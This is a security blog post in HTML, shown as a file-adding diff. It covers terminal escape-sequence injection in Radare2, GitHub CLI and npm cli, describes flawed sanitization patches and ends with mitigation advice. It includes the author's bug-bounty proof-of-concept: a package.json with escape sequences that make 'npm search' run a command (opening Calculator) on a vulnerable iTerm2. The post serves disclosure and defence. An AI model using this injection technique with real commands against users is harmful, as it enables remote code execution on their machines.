@@ -1,0 +1,488 @@
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>npm search RCE? - Escape Sequence Injection | solid-snail blog</title>
+<meta name="generator" content="Jekyll v3.9.5">
+<meta property="og:title" content="npm search RCE? - Escape Sequence Injection">
+<meta property="og:locale" content="en_US">
+<meta name="description" content="How many programmers does it take to filter out 36 characters? You may think this is an opening to a joke, but it’s not.">
+<meta property="og:description" content="How many programmers does it take to filter out 36 characters? You may think this is an opening to a joke, but it’s not.">
+<link rel="canonical" href="https://blog.solidsnail.com/posts/npm-esc-seq">
+<meta property="og:url" content="https://blog.solidsnail.com/posts/npm-esc-seq">
+<meta property="og:site_name" content="solid-snail blog">
+<meta property="og:image" content="https://blog.solidsnail.com/assets/img/snail-terminal.png">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2023-12-14T16:00:00+00:00">
+<meta name="twitter:card" content="summary_large_image">
+<meta property="twitter:image" content="https://blog.solidsnail.com/assets/img/snail-terminal.png">
+<meta property="twitter:title" content="npm search RCE? - Escape Sequence Injection">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-12-14T16:00:00+00:00","datePublished":"2023-12-14T16:00:00+00:00","description":"How many programmers does it take to filter out 36 characters? You may think this is an opening to a joke, but it’s not.","headline":"npm search RCE? - Escape Sequence Injection","image":"https://blog.solidsnail.com/assets/img/snail-terminal.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.solidsnail.com/posts/npm-esc-seq"},"url":"https://blog.solidsnail.com/posts/npm-esc-seq"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://blog.solidsnail.com/feed.xml" title="solid-snail | blog">
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">solid-snail | blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger">
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/donate/">Donate</a><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">npm search RCE? - Escape Sequence Injection</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2023-12-14T16:00:00+00:00" itemprop="datePublished">
+        Dec 14, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>How many programmers does it take to filter out 36 characters?
+You may think this is an opening to a joke,
+but it’s not.</p>
+
+<blockquote>
+  <p><strong>update</strong> (2024-02-05): a patch was released for npm in v10.3.0,
+addressing and fixing the vulnerability.</p>
+</blockquote>
+
+<p><img src="/assets/img/snail-terminal.png" alt="snail-terminal"></p>
+
+<blockquote>
+  <p><strong>Note:</strong> ‘code points’ would be a more accurate term than ‘characters’,
+but I’ll probably keep using ‘character’ for the rest of this post.</p>
+</blockquote>
+
+<p>In <a href="/posts/2023-08-28-iterm2-rce">a previous post</a> I went over a vulnerability I discovered in iTerm2
+that allowed code execution in the shell by leveraging the output of a command.
+Today, We’ll focus on the other side of that interaction,
+the application running underneath the terminal.</p>
+
+<p>I’ll touch on reports I’ve personally made on this issue
+(Radare2, Github CLI, npm cli),<br>
+how to exploit it with or without a vulnerability in the terminal itself,<br>
+what challenges drove developers to fumble this seemingly trivial task,<br>
+and my recommendations regarding mitigation.</p>
+
+<blockquote>
+  <p>Also,
+someone brought to my attention that there’s a pretty good
+<a href="https://www.youtube.com/watch?v=Y4A7KMQEmfo">Defcon video</a>
+(and <a href="https://dgl.cx/2023/09/ansi-terminal-security">write-up</a>)
+on similar vulnerabilities.
+Would recommend.</p>
+</blockquote>
+
+<h2 id="brief-on-escape-sequences">Brief on Escape Sequences</h2>
+
+<p><em>Feel free to skip this section if you’re already familiar.</em></p>
+
+<p><a href="https://notes.burke.libbey.me/ansi-escape-codes/">Escape sequences</a>,
+sometimes also called control sequences,
+are the way terminal emulators and the application running beneath them communicate with each other.
+That is how colored output, loading bars, and mouse control are implemented.
+The important thing to remember is that they are embedded in the standard output and input.</p>
+
+<p>I’ll give some examples:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s1">'\x1b[32mThis text will be green'</span>
+<span class="nb">printf</span> <span class="s1">'This will create a scroll region: \x1b[3;5r - try pressing Enter a bunch of times'</span>
+<span class="nb">printf</span> <span class="s1">'This will type for you: \x1b]4;0;?\x1b\\'</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">\x1b</code> is the Escape character.
+And yes, it does refer to the Esc key on your keyboard.
+In a terminal, try pressing Esc, releasing it, and then pressing P.
+It will behave the same as Alt+p.</p>
+
+<p>There are other characters that can initiate a sequence called C1 controls.
+I won’t get too much into it,
+but for example U+009B (<code class="language-plaintext highlighter-rouge">\u009b</code>) can replace <code class="language-plaintext highlighter-rouge">\x1b[</code>.</p>
+
+<p>The last example demonstrates what happens when a response is left in stdin.
+It is picked up by the shell as input.
+In my <a href="/posts/2023-08-28-iterm2-rce">iTerm2 post</a> I used a response that includes a newline
+to automatically execute a command.
+The interesting thing about it is that nothing in the standards dictates
+that terminal emulators should not do that.
+It can be argued that it is up to the application to not send unauthorized queries,
+but most terminals avoid it regardless because it is bound to be abused.</p>
+
+<h2 id="radare2">Radare2</h2>
+
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-0302">CVE-2023-0302</a></p>
+
+<p>Lets forget for a moment about vulnerabilities in the terminal itself.
+What can we do with the <em>“normal”</em> stuff?</p>
+
+<ul>
+  <li>Change color of text and background.</li>
+  <li>Set text as bold, italic, underlined…</li>
+  <li>Make the cursor invisible.</li>
+  <li>Set the location of the cursor.</li>
+  <li>Set a scroll region.</li>
+  <li>Manipulating window properties - setting window title, icon, size and location
+(not all terminals implement all of these features).</li>
+  <li>Disable line overflow.</li>
+</ul>
+
+<p>All of the above and more allow you to manipulate elements of the UI.</p>
+
+<p>Additionally, all terminals push responses to queries to stdin.
+So even if an attacker couldn’t execute a command automatically,
+they could do something like manipulating the UI to show something like a disclaimer,
+asking the user to press Enter for confirmation.
+Unbeknownst to the user,
+a shell command printed outside the boundaries of the screen would be executed.</p>
+
+<p>The vulnerability in <a href="https://github.com/radareorg/radare2">Radare2</a> linked above,
+allowed escape sequences embedded in the debug info (DWARF section) of an ELF
+to be printed to the terminal.</p>
+
+<p>The most straight forward use case for an attacker would be
+obfuscation during malware analysis.
+Manipulating the data displayed by Radare2.</p>
+
+<p>The <a href="https://github.com/radareorg/radare2/commit/961f0e723903011d4f54c2396e44efa91fcc74ce">original patch</a>
+used the following to sanitize inputs:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">size_t</span> <span class="nf">__str_ansi_length</span><span class="p">(</span><span class="kt">char</span> <span class="k">const</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x1b</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">str</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'['</span><span class="p">)</span> <span class="p">{</span>
+			<span class="n">i</span><span class="o">++</span><span class="p">;</span>
+			<span class="k">while</span> <span class="p">(</span><span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'J'</span> <span class="o">&amp;&amp;</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'m'</span> <span class="o">&amp;&amp;</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'H'</span> <span class="o">&amp;&amp;</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'K'</span><span class="p">)</span> <span class="p">{</span>
+				<span class="n">i</span><span class="o">++</span><span class="p">;</span>
+			<span class="p">}</span>
+		<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">str</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'#'</span><span class="p">)</span> <span class="p">{</span>
+			<span class="k">while</span> <span class="p">(</span><span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'q'</span><span class="p">)</span> <span class="p">{</span>
+				<span class="n">i</span><span class="o">++</span><span class="p">;</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">{</span>
+			<span class="n">i</span><span class="o">++</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="n">i</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">R_API</span> <span class="kt">size_t</span> <span class="nf">r_str_ansi_strip</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="k">while</span> <span class="p">(</span><span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">{</span>
+		<span class="kt">size_t</span> <span class="n">chlen</span> <span class="o">=</span> <span class="n">__str_ansi_length</span> <span class="p">(</span><span class="n">str</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">chlen</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+			<span class="n">r_str_cpy</span> <span class="p">(</span><span class="n">str</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">str</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="n">chlen</span><span class="p">);</span>
+		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+			<span class="n">i</span><span class="o">++</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="n">i</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>There are some issues there.</p>
+
+<p>As far as I can tell,
+the function <code class="language-plaintext highlighter-rouge">__str_ansi_length</code> was originally utilized elsewhere
+for calculating the length of the string in its printed form,
+not sanitization.
+It therefore misses some cases that could be abused.
+It also fails to sanitize an ESC character in the last byte,
+allowing an attacker to bypass it
+by splitting the rest of the sequence to a consecutive print.</p>
+
+<p>To be fair, I approved it before it was released…</p>
+
+<p>After noticing those flaws while writing this,
+I submitted <a href="https://github.com/radareorg/radare2/pull/22385">a PR to address them</a>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">size_t</span> <span class="nf">__str_ansi_sanitize_length</span><span class="p">(</span><span class="kt">char</span> <span class="k">const</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x1b</span> <span class="o">||</span> <span class="n">str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x07</span> <span class="o">||</span> <span class="n">str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x05</span> <span class="o">||</span> <span class="n">str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x7f</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// ESC, BEL, ENQ, DEL</span>
+		<span class="n">i</span><span class="o">++</span><span class="p">;</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mh">0x3e</span> <span class="o">&amp;&amp;</span> <span class="n">str</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="o">-</span><span class="mh">0x80</span> <span class="o">&amp;&amp;</span> <span class="n">str</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="o">-</span><span class="mh">0x61</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// C1 control codes U+0080 - U+009F</span>
+		<span class="n">i</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="n">i</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">R_API</span> <span class="kt">size_t</span> <span class="nf">r_str_ansi_strip</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+	<span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="k">while</span> <span class="p">(</span><span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">{</span>
+		<span class="kt">size_t</span> <span class="n">chlen</span> <span class="o">=</span> <span class="n">__str_ansi_length</span> <span class="p">(</span><span class="n">str</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
+		<span class="kt">size_t</span> <span class="n">sanitize_len</span> <span class="o">=</span> <span class="n">__str_ansi_sanitize_length</span> <span class="p">(</span><span class="n">str</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">chlen</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+			<span class="n">r_str_cpy</span> <span class="p">(</span><span class="n">str</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">str</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="n">chlen</span><span class="p">);</span>
+		<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">sanitize_len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+			<span class="n">r_str_cpy</span> <span class="p">(</span><span class="n">str</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">str</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="n">sanitize_len</span><span class="p">);</span>
+		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+			<span class="n">i</span><span class="o">++</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="n">i</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>It was quickly approved and merged.</p>
+
+<p>BTW, <a href="https://github.com/radareorg/radare2">Radare2</a>’s maintainer is doing a tremendous job.
+If you see value in the project
+I’d urge you to contribute either <a href="https://github.com/radareorg/radare2/blob/master/CONTRIBUTING.md">time</a>
+or <a href="https://opencollective.com/radareorg">money</a>.</p>
+
+<h2 id="github-cli">Github CLI</h2>
+
+<p>The case of gh cli is quite interesting.
+It was the first time I managed to demonstrate RCE using this injection method,
+and the way the devs chose to fix it was a bit… ehm, peculiar.</p>
+
+<p>To achieve RCE I utilized a specific feature of a terminal named iTerm2
+that responded to a query with a newline.
+That response is pushed to stdin by the terminal.
+Since gh cli doesn’t pull data from stdin normally,
+it was left there for the shell.
+The shell interpreted the newline as the user pressing Enter.
+That allowed me to run an executable in a specific path.
+You can read more about it in my <a href="/posts/2023-08-28-iterm2-rce">previous post</a>.</p>
+
+<p>There are plenty of ways to get gh cli to print user generated content.
+Issues, PR requests and more.
+At the time none of it was sanitized.
+The executable would theoretically be in a repo that the user cloned themselves.</p>
+
+<p>It was one of the first times I reported to a bug bounty program.
+After overcoming the challenge of my own clumsy reporting
+and Github’s team managing to reproduce the bug (sneaky <code class="language-plaintext highlighter-rouge">$PAGER</code> trying to undermine my PoC!),
+it was accepted and they started working on a fix.</p>
+
+<p>And the fix is…<br>
+<em>Drumroll</em><br>
+Sanitizing serialized JSON (pre-parsed) of HTTP responses!<br>
+Uhm<br>
+.<br>
+.<br>
+.<br>
+Wha-?</p>
+
+<p><a href="https://github.com/cli/cli/releases/tag/v2.23.0">https://github.com/cli/cli/releases/tag/v2.23.0</a></p>
+
+<p>The good is that they did try to address C1 controls to avoid a bypass.</p>
+
+<p>The bad is that they failed to handle non-HTTP responses,
+and forgot the JSON specification
+doesn’t require control characters above the ASCII range to be escaped.
+For example U+009B doesn’t have to appear as <code class="language-plaintext highlighter-rouge">\u009b</code> in the raw JSON,
+even if it isn’t visible by itself.</p>
+
+<p>The ugly is that they didn’t properly handle preceding backslashes,
+resulting in a DoS bug,
+and then mishandled preceding backslash <em>again</em>,
+resulting in another bypass.</p>
+
+<p>So why such a weird solution?</p>
+
+<p>My best guess is that they wanted to hook into a bottleneck in the process.
+The point of printing wouldn’t work since that would include legitimate escape sequences,
+so they went with the opposite end of the of the process.</p>
+
+<p>If I were to go with that approach,
+I’d try to hook into a point after the JSON is parsed.
+Perhaps wrap/override the default <code class="language-plaintext highlighter-rouge">Decoder</code> or <code class="language-plaintext highlighter-rouge">Unmarshaler</code>,
+and sanitize the relevant characters from the resulting string fields.
+<em>But</em>, I didn’t explore that option in-depth,
+so they might have had a good reason not to.</p>
+
+<p>To achieve RCE,
+you would have needed to utilize one of the two exploits I presented in my
+<a href="/posts/2023-08-28-iterm2-rce">iTerm2 post</a>.
+Particularly the one related to the <code class="language-plaintext highlighter-rouge">RequestUpload</code> feature,
+since you’ll be able to deliver an executable through a cloned repo.</p>
+
+<p><img src="/assets/img/gh-cli-sassy-branch-name.png" alt="sassy branch name"></p>
+
+<p>Don’t get sassy with me <a href="https://github.com/samcoe">@samcoe</a>.
+It ends when it ends.</p>
+
+<h2 id="npm-cli">NPM CLI</h2>
+
+<p>For the npm cli report I managed to come up with an exploit that didn’t require an executable.
+It involved a command named <code class="language-plaintext highlighter-rouge">m4</code>. Again, you can read about it in my <a href="/posts/2023-08-28-iterm2-rce">previous post</a>.</p>
+
+<p>So, npm devs <a href="https://github.com/npm/cli/releases/tag/v9.7.0">released a fix</a>.<br>
+They used an already existing regex pattern <code class="language-plaintext highlighter-rouge">ansiTrim</code>.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">ansiTrim</span> <span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">RegExp</span><span class="p">(</span><span class="dl">'</span><span class="se">\</span><span class="s1">x1b(?:</span><span class="se">\\</span><span class="s1">[(?:</span><span class="se">\\</span><span class="s1">d+[ABCDEFGJKSTm]|</span><span class="se">\\</span><span class="s1">d+;</span><span class="se">\\</span><span class="s1">d+[Hfm]|</span><span class="dl">'</span> <span class="o">+</span>
+        <span class="dl">'</span><span class="se">\\</span><span class="s1">d+;</span><span class="se">\\</span><span class="s1">d+;</span><span class="se">\\</span><span class="s1">d+m|6n|s|u|</span><span class="se">\\</span><span class="s1">?25[lh])|</span><span class="se">\\</span><span class="s1">w)</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">g</span><span class="dl">'</span><span class="p">)</span>
+  <span class="k">return</span> <span class="nx">str</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="dl">''</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>From doing a bit of research into the code and git logs,
+it seems like its original purpose
+was to evaluate the length of a string in its printed form.
+Rings a bell?</p>
+
+<p>It was completely bypass-able, since it wasn’t designed for that purpose.</p>
+
+<p>After reporting a bypass they eventually released
+<a href="https://github.com/npm/cli/releases/tag/v10.2.0">another fix</a>.
+This time they used a package named <a href="https://www.npmjs.com/package/strip-ansi">strip-ansi</a>.
+It was still bypass-able.
+The package basically took the same approach of removing whole sequences using a pattern.
+There were some other issues like ignoring most C1 controls,
+or applying it only to <code class="language-plaintext highlighter-rouge">npm search</code> and not other commands,
+amongst other issues I already pointed out in the report.</p>
+
+<p>I-It’s not like I want Github to fix their vulnerabilities,
+so DON’T GET THE WRONG IDEA!
+I just wanted the Hackerone badges, that’s all.
+Who would even want comprehension of their work by fellow professionals?<br>
+<em>Baka!</em></p>
+
+<p>As it stands today, it is still mostly bypass-able.</p>
+
+<p>This is the exploit I submitted to <a href="https://hackerone.com/github?type=team">Github’s BBP</a>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>somepkg
+<span class="nb">cd </span>somepkg
+<span class="nb">echo</span> <span class="nt">-E</span> <span class="s1">'{ "publishConfig": { "registry": "http://localhost:4873" }, "description": "somepkg1$ qrefresh-client", "keywords": ["syscmd(open -a Calculator)\u001b[5n\u001bP$q$|\u001b\\\u001b[#|\u001b[14H\u001b[6n\u001bP1000p%session-changed $9 s\n"] }'</span> <span class="o">&gt;</span> package.json
+npm init <span class="nt">-y</span>
+npm publish
+
+<span class="c"># this should trigger the PoC, doesn't require to be run from this specific directory</span>
+npm search somepkg
+</code></pre></div></div>
+
+<p>For an explanation on how it works, see my <a href="/posts/2023-08-28-iterm2-rce">post about it</a>.</p>
+
+<p>Keep in mind that the current version of iTerm2 is patched against this.
+So for testing it the relevant version of iTerm2 is needed,
+or a different exploitation technique.
+I also used verdaccio as npm’s backend,
+but it <em>shouldn’t</em> make a difference.</p>
+
+<h2 id="mitigation">Mitigation</h2>
+
+<p>You take your data at some point before constructing the output,
+and filter out the following characters:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\u0007
+\u001b
+\u0080 - \u009f
+</code></pre></div></div>
+
+<p>And for good measure these as well:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\u0005
+\u007f
+</code></pre></div></div>
+
+<p>It will leave behind artifacts from the now ineffective sequence.
+If you believe it’s a good idea to parse out those sequences,
+keep in mind that it isn’t as trivial as you might think,
+and that even terminals aren’t consistent about parsing in some cases.
+You will probably end up with a parser differential <em>somewhere</em>.</p>
+
+<p>That’s it.<br>
+It is as simple as that.<br>
+Why most devs avoid it, is beyond me.</p>
+
+<p>The npm devs’ choice to continue the <a href="https://left-pad.io/">left-pad</a> legacy
+by using an external package,
+without fully understanding what it does,
+is especially disappointing.</p>
+
+<p>If you ignore the common denominator to all these events,
+me being the reporter (as you should!),
+then you can safely conclude
+that there is an over-arching issue with the way we develop software.</p>
+
+  </div><a class="u-url" href="/posts/npm-esc-seq" hidden=""></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="https://blog.solidsnail.com/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+      </div>
+      <div class="footer-col">
+        <p>This is where I post about my findings and projects.</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/solid-snail" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://hackerone.com/solid-snail" target="_blank" title="hackerone">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#hackerone"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://bugcrowd.com/solid-snail" target="_blank" title="bugcrowd">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#bugcrowd"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://huntr.dev/users/solid-snail/" target="_blank" title="huntr.dev">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#huntr.dev"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://matrix.to/#/@solidsnail:matrix.org" target="_blank" title="matrix">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#matrix"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://infosec.exchange/@solidsnail" target="_blank" title="mastodon">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#mastodon"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+
+
+
+</body></html>
